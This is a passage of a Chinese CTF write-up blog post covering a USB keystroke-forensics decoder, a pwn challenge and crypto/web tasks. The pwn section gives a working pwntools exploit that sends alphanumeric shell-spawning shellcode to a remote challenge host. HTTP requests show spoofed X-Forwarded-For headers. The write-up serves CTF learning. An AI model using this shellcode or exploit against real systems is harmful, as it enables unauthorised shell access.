class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"></span><br><span class="line"><span class="comment">#declare -A lcasekey</span></span><br><span class="line">lcasekey = &#123;&#125;</span><br><span class="line"><span class="comment">#declare -A ucasekey</span></span><br><span class="line">ucasekey = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#associate USB HID scan codes with keys</span></span><br><span class="line"><span class="comment">#ex: key 4  can be both "a" and "A", depending on if SHIFT is held down</span></span><br><span class="line">lcasekey[<span class="number">4</span>]=<span class="string">"a"</span>;           ucasekey[<span class="number">4</span>]=<span class="string">"A"</span></span><br><span class="line">lcasekey[<span class="number">5</span>]=<span class="string">"b"</span>;           ucasekey[<span class="number">5</span>]=<span class="string">"B"</span></span><br><span class="line">lcasekey[<span class="number">6</span>]=<span class="string">"c"</span>;           ucasekey[<span class="number">6</span>]=<span class="string">"C"</span></span><br><span class="line">lcasekey[<span class="number">7</span>]=<span class="string">"d"</span>;           ucasekey[<span class="number">7</span>]=<span class="string">"D"</span></span><br><span class="line">lcasekey[<span class="number">8</span>]=<span class="string">"e"</span>;           ucasekey[<span class="number">8</span>]=<span class="string">"E"</span></span><br><span class="line">lcasekey[<span class="number">9</span>]=<span class="string">"f"</span>;           ucasekey[<span class="number">9</span>]=<span class="string">"F"</span></span><br><span class="line">lcasekey[<span class="number">10</span>]=<span class="string">"g"</span>;          ucasekey[<span class="number">10</span>]=<span class="string">"G"</span></span><br><span class="line">lcasekey[<span class="number">11</span>]=<span class="string">"h"</span>;          ucasekey[<span class="number">11</span>]=<span class="string">"H"</span></span><br><span class="line">lcasekey[<span class="number">12</span>]=<span class="string">"i"</span>;          ucasekey[<span class="number">12</span>]=<span class="string">"I"</span></span><br><span class="line">lcasekey[<span class="number">13</span>]=<span class="string">"j"</span>;          ucasekey[<span class="number">13</span>]=<span class="string">"J"</span></span><br><span class="line">lcasekey[<span class="number">14</span>]=<span class="string">"k"</span>;          ucasekey[<span class="number">14</span>]=<span class="string">"K"</span></span><br><span class="line">lcasekey[<span class="number">15</span>]=<span class="string">"l"</span>;          ucasekey[<span class="number">15</span>]=<span class="string">"L"</span></span><br><span class="line">lcasekey[<span class="number">16</span>]=<span class="string">"m"</span>;          ucasekey[<span class="number">16</span>]=<span class="string">"M"</span></span><br><span class="line">lcasekey[<span class="number">17</span>]=<span class="string">"n"</span>;          ucasekey[<span class="number">17</span>]=<span class="string">"N"</span></span><br><span class="line">lcasekey[<span class="number">18</span>]=<span class="string">"o"</span>;          ucasekey[<span class="number">18</span>]=<span class="string">"O"</span></span><br><span class="line">lcasekey[<span class="number">19</span>]=<span class="string">"p"</span>;          ucasekey[<span class="number">19</span>]=<span class="string">"P"</span></span><br><span class="line">lcasekey[<span class="number">20</span>]=<span class="string">"q"</span>;          ucasekey[<span class="number">20</span>]=<span class="string">"Q"</span></span><br><span class="line">lcasekey[<span class="number">21</span>]=<span class="string">"r"</span>;          ucasekey[<span class="number">21</span>]=<span class="string">"R"</span></span><br><span class="line">lcasekey[<span class="number">22</span>]=<span class="string">"s"</span>;          ucasekey[<span class="number">22</span>]=<span class="string">"S"</span></span><br><span class="line">lcasekey[<span class="number">23</span>]=<span class="string">"t"</span>;          ucasekey[<span class="number">23</span>]=<span class="string">"T"</span></span><br><span class="line">lcasekey[<span class="number">24</span>]=<span class="string">"u"</span>;          ucasekey[<span class="number">24</span>]=<span class="string">"U"</span></span><br><span class="line">lcasekey[<span class="number">25</span>]=<span class="string">"v"</span>;          ucasekey[<span class="number">25</span>]=<span class="string">"V"</span></span><br><span class="line">lcasekey[<span class="number">26</span>]=<span class="string">"w"</span>;          ucasekey[<span class="number">26</span>]=<span class="string">"W"</span></span><br><span class="line">lcasekey[<span class="number">27</span>]=<span class="string">"x"</span>;          ucasekey[<span class="number">27</span>]=<span class="string">"X"</span></span><br><span class="line">lcasekey[<span class="number">28</span>]=<span class="string">"y"</span>;          ucasekey[<span class="number">28</span>]=<span class="string">"Y"</span></span><br><span class="line">lcasekey[<span class="number">29</span>]=<span class="string">"z"</span>;          ucasekey[<span class="number">29</span>]=<span class="string">"Z"</span></span><br><span class="line">lcasekey[<span class="number">30</span>]=<span class="string">"1"</span>;          ucasekey[<span class="number">30</span>]=<span class="string">"!"</span></span><br><span class="line">lcasekey[<span class="number">31</span>]=<span class="string">"2"</span>;          ucasekey[<span class="number">31</span>]=<span class="string">"@"</span></span><br><span class="line">lcasekey[<span class="number">32</span>]=<span class="string">"3"</span>;          ucasekey[<span class="number">32</span>]=<span class="string">"#"</span></span><br><span class="line">lcasekey[<span class="number">33</span>]=<span class="string">"4"</span>;          ucasekey[<span class="number">33</span>]=<span class="string">"$"</span></span><br><span class="line">lcasekey[<span class="number">34</span>]=<span class="string">"5"</span>;          ucasekey[<span class="number">34</span>]=<span class="string">"%"</span></span><br><span class="line">lcasekey[<span class="number">35</span>]=<span class="string">"6"</span>;          ucasekey[<span class="number">35</span>]=<span class="string">"^"</span></span><br><span class="line">lcasekey[<span class="number">36</span>]=<span class="string">"7"</span>;          ucasekey[<span class="number">36</span>]=<span class="string">"&amp;"</span></span><br><span class="line">lcasekey[<span class="number">37</span>]=<span class="string">"8"</span>;          ucasekey[<span class="number">37</span>]=<span class="string">"*"</span></span><br><span class="line">lcasekey[<span class="number">38</span>]=<span class="string">"9"</span>;          ucasekey[<span class="number">38</span>]=<span class="string">"("</span></span><br><span class="line">lcasekey[<span class="number">39</span>]=<span class="string">"0"</span>;          ucasekey[<span class="number">39</span>]=<span class="string">")"</span></span><br><span class="line">lcasekey[<span class="number">40</span>]=<span class="string">"&lt;Enter&gt;"</span>;      ucasekey[<span class="number">40</span>]=<span class="string">"&lt;Enter&gt;"</span></span><br><span class="line">lcasekey[<span class="number">41</span>]=<span class="string">"&lt;esc&gt;"</span>;        ucasekey[<span class="number">41</span>]=<span class="string">"&lt;esc&gt;"</span></span><br><span class="line">lcasekey[<span class="number">42</span>]=<span class="string">"&lt;del&gt;"</span>;        ucasekey[<span class="number">42</span>]=<span class="string">"&lt;del&gt;"</span></span><br><span class="line">lcasekey[<span class="number">43</span>]=<span class="string">"&lt;tab&gt;"</span>;        ucasekey[<span class="number">43</span>]=<span class="string">"&lt;tab&gt;"</span></span><br><span class="line">lcasekey[<span class="number">44</span>]=<span class="string">"&lt;space&gt;"</span>;      ucasekey[<span class="number">44</span>]=<span class="string">"&lt;space&gt;"</span></span><br><span class="line">lcasekey[<span class="number">45</span>]=<span class="string">"-"</span>;          ucasekey[<span class="number">45</span>]=<span class="string">"_"</span></span><br><span class="line">lcasekey[<span class="number">46</span>]=<span class="string">"="</span>;          ucasekey[<span class="number">46</span>]=<span class="string">"+"</span></span><br><span class="line">lcasekey[<span class="number">47</span>]=<span class="string">"["</span>;          ucasekey[<span class="number">47</span>]=<span class="string">"&#123;"</span></span><br><span class="line">lcasekey[<span class="number">48</span>]=<span class="string">"]"</span>;          ucasekey[<span class="number">48</span>]=<span class="string">"&#125;"</span></span><br><span class="line">lcasekey[<span class="number">49</span>]=<span class="string">"\\"</span>;         ucasekey[<span class="number">49</span>]=<span class="string">"|"</span></span><br><span class="line">lcasekey[<span class="number">50</span>]=<span class="string">" "</span>;          ucasekey[<span class="number">50</span>]=<span class="string">" "</span></span><br><span class="line">lcasekey[<span class="number">51</span>]=<span class="string">";"</span>;          ucasekey[<span class="number">51</span>]=<span class="string">":"</span></span><br><span class="line">lcasekey[<span class="number">52</span>]=<span class="string">"'"</span>;          ucasekey[<span class="number">52</span>]=<span class="string">"\""</span></span><br><span class="line">lcasekey[<span class="number">53</span>]=<span class="string">"`"</span>;          ucasekey[<span class="number">53</span>]=<span class="string">"~"</span></span><br><span class="line">lcasekey[<span class="number">54</span>]=<span class="string">","</span>;          ucasekey[<span class="number">54</span>]=<span class="string">"&lt;"</span></span><br><span class="line">lcasekey[<span class="number">55</span>]=<span class="string">"."</span>;          ucasekey[<span class="number">55</span>]=<span class="string">"&gt;"</span></span><br><span class="line">lcasekey[<span class="number">56</span>]=<span class="string">"/"</span>;          ucasekey[<span class="number">56</span>]=<span class="string">"?"</span></span><br><span class="line">lcasekey[<span class="number">57</span>]=<span class="string">"&lt;CapsLock&gt;"</span>;   ucasekey[<span class="number">57</span>]=<span class="string">"&lt;CapsLock&gt;"</span></span><br><span class="line">lcasekey[<span class="number">79</span>]=<span class="string">"&lt;RightArrow&gt;"</span>; ucasekey[<span class="number">79</span>]=<span class="string">"&lt;RightArrow&gt;"</span></span><br><span class="line">lcasekey[<span class="number">80</span>]=<span class="string">"&lt;LeftArrow&gt;"</span>;  ucasekey[<span class="number">80</span>]=<span class="string">"&lt;LeftArrow&gt;"</span></span><br><span class="line">lcasekey[<span class="number">84</span>]=<span class="string">"/"</span>;          ucasekey[<span class="number">84</span>]=<span class="string">"/"</span></span><br><span class="line">lcasekey[<span class="number">85</span>]=<span class="string">"*"</span>;          ucasekey[<span class="number">85</span>]=<span class="string">"*"</span></span><br><span class="line">lcasekey[<span class="number">86</span>]=<span class="string">"-"</span>;          ucasekey[<span class="number">86</span>]=<span class="string">"-"</span></span><br><span class="line">lcasekey[<span class="number">87</span>]=<span class="string">"+"</span>;          ucasekey[<span class="number">87</span>]=<span class="string">"+"</span></span><br><span class="line">lcasekey[<span class="number">88</span>]=<span class="string">"&lt;Enter&gt;"</span>;      ucasekey[<span class="number">88</span>]=<span class="string">"&lt;Enter&gt;"</span></span><br><span class="line">lcasekey[<span class="number">89</span>]=<span class="string">"1"</span>;          ucasekey[<span class="number">89</span>]=<span class="string">"1"</span></span><br><span class="line">lcasekey[<span class="number">90</span>]=<span class="string">"2"</span>;          ucasekey[<span class="number">90</span>]=<span class="string">"2"</span></span><br><span class="line">lcasekey[<span class="number">91</span>]=<span class="string">"3"</span>;          ucasekey[<span class="number">91</span>]=<span class="string">"3"</span></span><br><span class="line">lcasekey[<span class="number">92</span>]=<span class="string">"4"</span>;          ucasekey[<span class="number">92</span>]=<span class="string">"4"</span></span><br><span class="line">lcasekey[<span class="number">93</span>]=<span class="string">"5"</span>;          ucasekey[<span class="number">93</span>]=<span class="string">"5"</span></span><br><span class="line">lcasekey[<span class="number">94</span>]=<span class="string">"6"</span>;          ucasekey[<span class="number">94</span>]=<span class="string">"6"</span></span><br><span class="line">lcasekey[<span class="number">95</span>]=<span class="string">"7"</span>;          ucasekey[<span class="number">95</span>]=<span class="string">"7"</span></span><br><span class="line">lcasekey[<span class="number">96</span>]=<span class="string">"8"</span>;          ucasekey[<span class="number">96</span>]=<span class="string">"8"</span></span><br><span class="line">lcasekey[<span class="number">97</span>]=<span class="string">"9"</span>;          ucasekey[<span class="number">97</span>]=<span class="string">"9"</span></span><br><span class="line">lcasekey[<span class="number">98</span>]=<span class="string">"0"</span>;          ucasekey[<span class="number">98</span>]=<span class="string">"0"</span></span><br><span class="line">lcasekey[<span class="number">99</span>]=<span class="string">"."</span>;          ucasekey[<span class="number">99</span>]=<span class="string">"."</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make sure filename to open has been provided</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">	keycodes = open(sys.argv[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> keycodes:</span><br><span class="line">		<span class="comment">#dump line to bytearray</span></span><br><span class="line">		bytesArray = bytearray.fromhex(line.strip())</span><br><span class="line">		<span class="comment">#see if we have a key code</span></span><br><span class="line">		val = int(bytesArray[<span class="number">2</span>])</span><br><span class="line">		<span class="keyword">if</span> val &gt; <span class="number">3</span> <span class="keyword">and</span> val &lt; <span class="number">100</span>:</span><br><span class="line">			<span class="comment">#see if left shift or right shift was held down</span></span><br><span class="line">			<span class="keyword">if</span> bytesArray[<span class="number">0</span>] == <span class="number">0x02</span> <span class="keyword">or</span> bytesArray[<span class="number">0</span>] == <span class="number">0x20</span> :</span><br><span class="line">				print(ucasekey[int(bytesArray[<span class="number">2</span>])], end=<span class="string">''</span>),  <span class="comment">#single line output</span></span><br><span class="line">				<span class="comment">#print(ucasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				print(lcasekey[int(bytesArray[<span class="number">2</span>])], end=<span class="string">''</span>),  <span class="comment">#single line output</span></span><br><span class="line">				<span class="comment">#print(lcasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"USAGE: python %s [filename]"</span> % os.path.basename(__file__))</span><br></pre></td></tr></table></figure>
+<img src="/2022/05/30/Web-22/20ad031e-436d-4b3e-8b20-942e4bffa63d.png" alt></li>
+</ol>
+<p>提取出来是：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">526172211</span>a<span class="number">0700</span>Cf<span class="number">907300000</span>d<span class="number">00000000000000</span><span class="keyword">c</span><span class="number">4527424943500300000002</span>a<span class="number">00000002</span>b<span class="number">9</span>f<span class="number">9</span>b<span class="number">0530778</span>b<span class="number">5541</span>d<span class="number">33080020000000666</span><span class="keyword">c</span><span class="number">61672e747874</span>b<span class="number">9</span>ba<span class="number">013242</span>f<span class="number">3</span>afc<span class="number">000</span>b<span class="number">092</span><span class="keyword">c</span><span class="number">229</span>d<span class="number">6e994167</span><span class="keyword">c</span><span class="number">05</span>a<span class="number">78708</span>b<span class="number">271</span>ffc<span class="number">042</span>ae<span class="number">3</span>d<span class="number">251e65536</span>f<span class="number">9</span>ada<span class="number">87</span><span class="keyword">c</span><span class="number">77406</span>b<span class="number">67</span>d<span class="number">0e6316684766</span>a<span class="number">86e844</span>dc<span class="number">81</span>aa<span class="number">2</span><span class="keyword">c</span><span class="number">72</span><span class="keyword">c</span><span class="number">71348</span>d<span class="number">10</span><span class="keyword">c</span><span class="number">43</span>d<span class="number">7</span>b<span class="number">00400700</span>e</span><br></pre></td></tr></table></figure>
+<p>看一下头几个字节，是rar压缩包的格式<br><img src="/2022/05/30/Web-22/7e667985-ab12-4c32-bac5-1c905d3fdfeb.png" alt><br>需要密码，再提取一下2.10.1的usb流量，里面的内容就是密码</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">35</span>c535765e50074a</span><br><span class="line">拿到flag</span><br></pre></td></tr></table></figure>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.44.34.png" alt="截屏2022-05-29 下午6.44.34"></p>
+<p>libc2.33</p>
+<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>首先我们在s处可以输入一个比较大的字符串。</p>
+<p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.45.35.png" alt="截屏2022-05-29 下午6.45.35"></p>
+<p>参考2021 ciscn game，先逆出程序指令为<code>opt:1\nmsg:ro0t\r\n</code>格式,在下面三个功能中可以发现，mmap申请了一片4096size的可执行空间，并将s的内容拷贝进去，而需要申请首先需要切换至root。</p>
+<p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.48.44.png" alt="截屏2022-05-29 下午6.48.44"></p>
+<p>并且在最后一句直接执行了s，这里基本可以确定是一个写shellcode的思路了。shellcode的地址储存在rdx寄存器上。</p>
+<p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.49.50.png" alt="截屏2022-05-29 下午6.49.50"></p>
+<p>这里对我们输入的msg字符串进行了过滤，也就是shellcode必须为可见字符串。之前做过类似的题，可以直接使用工具生成。</p>
+<p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.51.22.png" alt="截屏2022-05-29 下午6.51.22"></p>
+<p>这里使用<a href="https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后" target="_blank" rel="noopener">https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./login'</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">'rdx'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>​    即可生成shellcode。</p>
+<p>最后的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"59.110.24.117"</span>,<span class="number">12587</span>)</span><br><span class="line">payload1 = <span class="string">b"opt:1\nmsg:ro0t\r\n"</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,payload1)</span><br><span class="line">shellcode = <span class="string">b"RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP"</span></span><br><span class="line">payload2 = <span class="string">b"opt:2\nmsg:"</span> + shellcode + <span class="string">b"\r\n"</span></span><br><span class="line">print(disasm(shellcode))</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">123.56</span><span class="number">.111</span><span class="number">.202</span> <span class="number">30465</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/05/30/Web-22/e2412878-4605-4372-ac59-07ac64991751.png" alt><br>755权限直接读</p>
+<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">'1732251413440356045166710055'</span></span><br><span class="line">s2 = <span class="string">'2832531571357564882876880585'</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">result</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(28):</span><br><span class="line">    <span class="attribute">s</span>=str((int(s1[i])+int(s2[i]))%10)</span><br><span class="line">    result+=s</span><br><span class="line"><span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>拿到session</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/send?msg=s</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914;</span> <span class="string">__jsluid_h=5fb2a5f243a8185197d87fda46477685;</span> <span class="string">session=eyJzdGF0dXMiOiJzdGFydCIsInVzZXIiOjEzOTI4ODAxOTY4ODE1MTEzMTM4NTg2MjUzOTczNDgzNzIwMjk0Nn0.YpLppQ.O6BssQxRhhdp7dexJDlmdegZKRc</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/send?msg=3564782984797810827932590530</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914;</span> <span class="string">__jsluid_h=5fb2a5f243a8185197d87fda46477685;</span> <span class="string">session=eyJzdGF0dXMiOiJzdGFydCIsInVzZXIiOjEzOTI4ODAxOTY4ODE1MTEzMTM4NTg2MjUzOTczNDgzNzIwMjk0Nn0.YpLppQ.O6BssQxRhhdp7dexJDlmdegZKRc</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2022/05/30/Web-22/" title="Web-22">https://jlkl.github.io/2022/05/30/Web-22/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/26/Java-10/" rel="prev" title="Agent Memory Shell">
+      <i class="fa fa-chevron-left"></i> Agent Memory Shell
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
